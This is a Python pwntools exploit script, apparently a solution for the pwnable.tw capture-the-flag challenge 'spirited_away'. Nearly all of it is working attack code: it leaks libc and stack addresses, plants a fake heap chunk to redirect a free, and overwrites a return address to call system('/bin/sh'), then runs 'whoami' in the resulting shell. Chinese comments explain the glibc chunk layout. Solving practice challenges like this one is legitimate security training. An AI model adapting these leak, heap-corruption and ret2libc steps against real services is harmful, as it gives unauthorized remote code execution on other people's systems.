from pwn import *

context.terminal = ['tmux','split','-h']
context.log_level = 'debug'

#p = process("./spirited_away")
p = remote("chall.pwnable.tw", 10204)
elf = ELF("./spirited_away")
libc = ELF("./libc_32.so.6")




def leave(name,reason,comment):
    p.sendafter('Please enter your name: ', name)
    p.sendafter('Please enter your age: ', '1\n')
    p.sendafter('Why did you came to see this movie? ', reason)
    p.sendafter('Please enter your comment: ', comment)





for i in range(10):
    leave('cat\0','cc\0','aa\0')
    p.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

# p.interactive()
# dont know why exceed 10 it will not read name
for i in range(90):
    p.sendafter('Please enter your age: ', '1\n')
    p.sendafter('Why did you came to see this movie? ', 'c\x00')
    p.sendafter('Would you like to leave another comment? <y/n>: ', 'y')
#leak libc
leave('cat\0','a'*0x14+'zzzz','bb')
p.recvuntil("zzzz")

# gdb.attach(p,'b *')

libc_base = u32(p.recv(4)) - 7 - libc.sym['_IO_file_sync']
print((hex(libc_base)))
system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
p.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

#leak stack
leave('cat\0','a'*0x34+'zzzz','bb')
p.recvuntil("zzzz")
stack = u32(p.recv(4)) - 0x70
print((hex(stack)))
p.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

#fake_chunk
'''
+-------------------------+
| prev_size (如果是空閒的)  | -> 當前 `chunk` 前一個空閒 `chunk` 的大小  
+-------------------------+
| size                    | -> 當前 `chunk` 的大小及狀態標記位
+-------------------------+
| data                    | -> 用戶可寫入的數據部分
+-------------------------+
| padding (可能存在)       | -> 用來保持對齊
+-------------------------+
| prev_size (下一個 `chunk`)|
+-------------------------+

p32(0) prev_size
p32(0x41) low 3 bytes size 0x40 = 60
b'a'*0x38 = 56
p32(0)    next chunk prev_size
p32(0x11) next chunk size 
'''


reason = p32(0)    +  p32(0x41) + b'a'*56 + p32(0) + p32(0x11)

comment = b'a'*0x54 + p32(stack+8)
leave('cat\0',reason,comment)
p.sendafter('Would you like to leave another comment? <y/n>: ', 'y')

#heap overflow
name = b'a'*0x4c + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh)
leave(name,'a\0','b\0')
# gd()
p.sendafter('Would you like to leave another comment? <y/n>: ', 'n')
time.sleep(1)
p.sendline("whoami")
p.interactive()






